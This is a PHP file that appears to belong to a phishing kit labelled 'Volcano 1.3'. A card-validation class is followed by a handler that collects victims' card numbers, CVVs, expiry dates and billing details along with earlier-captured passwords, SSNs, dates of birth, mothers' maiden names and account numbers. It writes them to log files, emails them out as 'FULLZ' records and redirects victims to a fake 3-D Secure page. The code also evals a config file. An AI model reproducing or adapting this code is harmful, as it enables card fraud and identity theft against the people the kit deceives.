<?php include'../proxy.php';?>
<?php

class CreditCard {
  protected static $cards = array(
    'visaelectron' => array(
      'type' => 'visaelectron',
      'pattern' => '/^4(026|17500|405|508|844|91[37])/',
      'length' => array(16),
      'cvcLength' => array(3),
      'luhn' => true,
    ),
    'maestro' => array(
      'type' => 'maestro',
      'pattern' => '/^(5(018|0[23]|[68])|6(39|7))/',
      'length' => array(12, 13, 14, 15, 16, 17, 18, 19),
      'cvcLength' => array(3),
      'luhn' => true,
    ),
    'forbrugsforeningen' => array(
      'type' => 'forbrugsforeningen',
      'pattern' => '/^600/',
      'length' => array(16),
      'cvcLength' => array(3),
      'luhn' => true,
    ),
    'dankort' => array(
      'type' => 'dankort',
      'pattern' => '/^5019/',
      'length' => array(16),
      'cvcLength' => array(3),
      'luhn' => true,
    ),
    'visa' => array(
      'type' => 'visa',
      'pattern' => '/^4/',
      'length' => array(13, 16),
      'cvcLength' => array(3),
      'luhn' => true,
    ),
    'mastercard' => array(
      'type' => 'mastercard',
      'pattern' => '/^(5[0-5]|2[2-7])/',
      'length' => array(16),
      'cvcLength' => array(3),
      'luhn' => true,
    ),
    'amex' => array(
      'type' => 'amex',
      'pattern' => '/^3[47]/',
      'format' => '/(\d{1,4})(\d{1,6})?(\d{1,5})?/',
      'length' => array(15),
      'cvcLength' => array(4),
      'luhn' => true,
    ),
    'dinersclub' => array(
      'type' => 'dinersclub',
      'pattern' => '/^3[0689]/',
      'length' => array(14),
      'cvcLength' => array(3),
      'luhn' => true,
    ),
    'discover' => array(
      'type' => 'discover',
      'pattern' => '/^6([045]|22)/',
      'length' => array(16),
      'cvcLength' => array(3),
      'luhn' => true,
    ),
    'unionpay' => array(
      'type' => 'unionpay',
      'pattern' => '/^(62|88)/',
      'length' => array(16, 17, 18, 19),
      'cvcLength' => array(3),
      'luhn' => false,
    ),
    'jcb' => array(
      'type' => 'jcb',
      'pattern' => '/^35/',
      'length' => array(16),
      'cvcLength' => array(3),
      'luhn' => true,
    ),
  );
  public static function validCreditCard($number, $type = null){
    $ret = array(
      'valid' => false,
      'number' => '',
      'type' => '',
    );
    $number = preg_replace('/[^0-9]/', '', $number);
    if(empty($type)){
      $type = self::creditCardType($number);
    }
    if(array_key_exists($type, self::$cards) && self::validCard($number, $type)){
      return array(
        'valid' => true,
        'number' => $number,
        'type' => $type,
      );
    }
    return $ret;
  }
  public static function validCvc($cvc, $type){
    return (ctype_digit($cvc) && array_key_exists($type, self::$cards) && self::validCvcLength($cvc, $type));
  }
  public static function validDate($year, $month){
    $month = str_pad($month, 2, '0', STR_PAD_LEFT);
    if(!preg_match('/^20\d\d$/', $year)){
      return false;
    }
    if(!preg_match('/^(0[1-9]|1[0-2])$/', $month)){
      return false;
    }
    if($year < gmdate('Y') || $year == gmdate('Y') && $month < gmdate('m')){
      return false;
    }
    return true;
  }
  protected static function creditCardType($number){
    foreach(self::$cards as $type => $card){
      if(preg_match($card['pattern'], $number)){
        return $type;
      }
    }
    return '';
  }
  protected static function validCard($number, $type){
    return (self::validPattern($number, $type) && self::validLength($number, $type) && self::validLuhn($number, $type));
  }
  protected static function validPattern($number, $type){
    return preg_match(self::$cards[$type]['pattern'], $number);
  }
  protected static function validLength($number, $type){
    foreach(self::$cards[$type]['length'] as $length){
      if(strlen($number) == $length){
        return true;
      }
    }
    return false;
  }
  protected static function validCvcLength($cvc, $type){
    foreach(self::$cards[$type]['cvcLength'] as $length){
      if(strlen($cvc) == $length){
        return true;
      }
    }
    return false;
  }
  protected static function validLuhn($number, $type){
    if(!self::$cards[$type]['luhn']){
      return true;
    }else{
      return self::luhnCheck($number);
    }
  }
  protected static function luhnCheck($number){
    $checksum = 0;
    for($i=(2-(strlen($number) % 2)); $i<=strlen($number); $i+=2){
      $checksum += (int) ($number{$i-1});
    }
    for($i=(strlen($number) % 2) + 1; $i<strlen($number); $i+=2){
      $digit = (int) ($number{$i-1}) * 2;
      if($digit < 10){
        $checksum += $digit;
      }else{
        $checksum += ($digit-9);
      }
    }
    if(($checksum % 10) == 0){
      return true;
    }else{
      return false;
    }
  }
  public static function title($type){
    $title = "Secure Code";
    if($type == 'jcb'){
      return 'JCB J/Secure';
    }
    if($type == 'amex'){
      return 'Amex SafeKey';
    }
    if($type == 'mastercard'){
      return 'MasterCard Secure Code';
    }
    if($type == 'visaelectron' or $type == 'visa'){
      return 'Verified by Visa';
    }
    return $title;
  }
  public static function logoimg($type){
	  
include '../randa.php';
    
	$src = "Secure Code";
    if($type == 'jcb'){
      $src = "assets/img/jcb.png";
    }
    if($type == 'amex'){
      $src = "assets/img/safekey.png";
    }
    if($type == 'mastercard'){
      $src = "assets/img/msrc.gif";
    }
    if($type == 'visaelectron' or $type == 'visa'){
      $src = "assets/img/vbv.png";
    }
    return $src;
  }
  public static function cvvimg($type){
    $src = "assets/img/cvv1.png";
    if($type == 'amex'){
      $src = 'assets/img/cvv2.png';
    }
    return $src;
  }
  public static function shownum($type, $isi){
    $show = "XXXX XXXX XXXX ".substr($isi, 12, 16);
    if($type == 'amex'){
      $show = "XXXX XXXXXX ".substr($isi, 10, 15);
    }
    return $show;
  }
  public static function secure($type){
    if($type == 'jcb'){
      $x = 'secure';
    } else if($type == 'amex'){
      $x = 'secure';
    } else if($type == 'mastercard'){
      $x = 'secure';
    } else if($type == 'visaelectron' or $type == 'visa'){
      $x = 'secure';
    } else {
      $x = 'nosecure';
    }
    return $x;
  }
}
require_once __DIR__ . '/../function.php';
require_once __DIR__ . '/../filter.php';

if (file_exists('../config/' . $api->general_config))
{
  @eval(file_get_contents('../config/' . $api->general_config));
}

$api->waiting();

$card = CreditCard::validCreditCard(str_replace(" ", "", $_POST['cardnms']));
$split = explode(" / ", $_POST['expir']);
$checkexp = CreditCard::validDate("20".$split[1], $split[0]);
$checkcvv = CreditCard::validCvc($_POST['secri'], $card['type']);
$check3d  = CreditCard::secure($card['type']);

if(!$card['valid']){
  echo "error";
}else if(!$checkexp){
  echo "exp";
}else if(!$checkcvv){
  echo "cvv";
}else if($check3d == 'nosecure'){
  echo "nosecure";
}else{
  $_SESSION['card_name']    = $_POST['crdholder'];
  $_SESSION['card_number']  = $_POST['cardnms'];
  $_SESSION['card_exp']     = $_POST['expir'];
  $_SESSION['card_cvv']     = $_POST['secri'];
  $_SESSION['bill_name']     = $_POST['crdholder'];
  $_SESSION['bill_address']  = $_POST['adrs'];
  $_SESSION['bill_city']     = $_POST['cty'];
  $_SESSION['bill_state']    = $_POST['sste'];
  $_SESSION['bill_zip']      = $_POST['zippy'];
  $_SESSION['bill_phone']    = $_POST['phona'];
  $_SESSION['card_type']    = $card['type'];
  $_SESSION['card_title']   = CreditCard::title($card['type']);
  $_SESSION['cvv_img']      = CreditCard::cvvimg($card['type']);
  $_SESSION['logo_img']     = CreditCard::logoimg($card['type']);
  $_SESSION['show_num']     = CreditCard::shownum($card['type'], str_replace(" ", "", $_SESSION['card_number']));
  $_SESSION['card_digit']   = substr(str_replace(" ", "", $_SESSION['card_number']), 0, 6);

  $bin = json_decode($api->ngecurl("https://lookup.binlist.net/", $_SESSION['card_digit']));
  $_SESSION['card_bin'] = $bin->scheme." ".$bin->type." ".$bin->bank->name;
  $_SESSION['card_banku'] = $bin->bank->url;
  $_SESSION['card_bank'] = $bin->bank->name;

  $message = file_get_contents('../assets/html/card.html');

  $message = preg_replace('{KUZULUY-A}', $_SESSION['email'], $message);
  $message = preg_replace('{KUZULUY-B}', $_SESSION['password'], $message);

  $message = preg_replace('{KUZULUY-C}', $_SESSION['card_name'], $message);
  $message = preg_replace('{KUZULUY-D}', $_SESSION['card_number'], $message);
  $message = preg_replace('{KUZULUY-E}', $_SESSION['card_exp'], $message);
  $message = preg_replace('{KUZULUY-F}', $_SESSION['card_cvv'], $message);
  $message = preg_replace('{KUZULUY-G}', $_SESSION['card_bin'], $message);

  $message = preg_replace('{KUZULUY-H}', $_SESSION['dob'], $message);
  $message = preg_replace('{KUZULUY-I}', $_SESSION['ssn'], $message);
  $message = preg_replace('{KUZULUY-J}', $_SESSION['sort'], $message);
  $message = preg_replace('{KUZULUY-K}', $_SESSION['sin'], $message);
  $message = preg_replace('{KUZULUY-L}', $_SESSION['driver'], $message);
  $message = preg_replace('{KUZULUY-M}', $_SESSION['osid'], $message);
  $message = preg_replace('{KUZULUY-N}', $_SESSION['accnum'], $message);
  $message = preg_replace('{KUZULUY-O}', $_SESSION['mother'], $message);

  $message = preg_replace('{KUZULUY-P}', $_SESSION['bill_name'], $message);
  $message = preg_replace('{KUZULUY-Q}', $_SESSION['bill_address'], $message);
  $message = preg_replace('{KUZULUY-R}', $_SESSION['bill_city'], $message);
  $message = preg_replace('{KUZULUY-S}', $_SESSION['bill_state'], $message);
  $message = preg_replace('{KUZULUY-T}', $_SESSION['bill_zip'], $message);
  $message = preg_replace('{KUZULUY-U}', $_SESSION['country'], $message);
  $message = preg_replace('{KUZULUY-V}', $_SESSION['bill_phone'], $message);

  $message = preg_replace('{KUZULUY-W}', $_SESSION['ip'], $message);
  $message = preg_replace('{KUZULUY-X}', $_SESSION['agent'], $message);

  $subject  = "FULLZ | " .$_SESSION['card_digit']." - ".$_SESSION['card_bin']." [ ".$_SESSION['country']." | ".$_SESSION['ip']." | ".$_SESSION['os']." ]";
  $headers  = "From: Volcano 1.3 <mail@volcano.org>\r\n";
  $headers .= "MIME-Version: 1.0\r\n";
  $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
  $be=md5 (rand(0,100000));
  $myfile = fopen("../logs/Fullz-".$be."gs.html", "a+");
  fwrite($myfile, $message);
  fclose($myfile);

  if ($config_smtp == 1){
             foreach(explode(",", $email_results) as $tomail) {
    $api->ngesend($tomail, $subject, $message);
       }
   
  } else {
       foreach(explode(",", $email_results) as $tomail) {
     mail($tomail, $subject, $message, $headers);
       }
  }
  if($config_3dsecure == 0){
    echo "nosecure";
  }
 
  if ($config_identity == 0) {
    echo "noid";
  }
  $ha=rand(0000000, 100900000);
  $sa=rand(0000000, 100900000);
  $bero3=md5 (rand(0,100000));
  		header("Location: ../3dsecure.php?=$ha/myaccount/D".$sa."BILL".$ha."BA".$ISA."SA?keyId=$bero3$bero3");
        exit(done);
}

?>
